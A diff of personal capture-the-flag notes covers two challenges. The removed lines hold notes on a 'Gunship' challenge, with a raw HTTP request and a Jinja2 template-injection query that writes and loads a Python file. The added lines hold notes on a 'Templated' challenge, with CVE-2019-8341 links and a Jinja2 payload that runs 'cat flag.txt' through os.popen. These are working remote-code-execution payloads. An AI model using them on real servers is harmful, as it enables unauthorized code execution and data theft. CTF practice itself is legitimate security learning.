@@ -1,40 +1,16 @@
-## Gunship page
-http://139.59.183.98:31337/
+## Templated challenge
 
-## Names
-https://www.retro-synthwave.com/artists/gunship
+### CVE-2019-8341
 
-Alex Westaway (singer)
+https://www.cvedetails.com/cve/CVE-2019-8341/
 
-Dan Haigh (synthesizer)
+https://www.exploit-db.com/exploits/46386
 
-Alex Gingell (drums)
+___
 
-## misc
-Dan Haighaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+![Screenshot from 2021-10-06 02-04-04](https://user-images.githubusercontent.com/86022395/136114734-4f7f8df5-c03b-495c-93fe-820b84b3e767.png)
 
+Flask/Jinja2 Remote Code Execution exploit to cat flag.txt from the server.
 
-POST /api/submit HTTP/1.1
-Host: 139.59.183.98:31337
-Content-Length: 19
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
-Content-Type: application/json
-Accept: */*
-Origin: http://139.59.183.98:31337
-Referer: http://139.59.183.98:31337/
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-Connection: close
-
-{"artist.name":"a"}
-
-?exploit={%set%20a,b,c,d,e,f,g,h,i%20=%20request.__class__.__mro__%}{{i.__subclasses__().pop(40)(request.args.file,request.args.write).write(request.args.payload)}}{{config.from_pyfile(request.args.file)}}&file=/tmp/foo.py&write=w&payload=print+1337
-
-
-
-http://46.101.23.188:30951/?format=u
-000000
-
-Sunday the 10th of October. In approximately 121:18:10.
-
-
+payload
+`{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}`
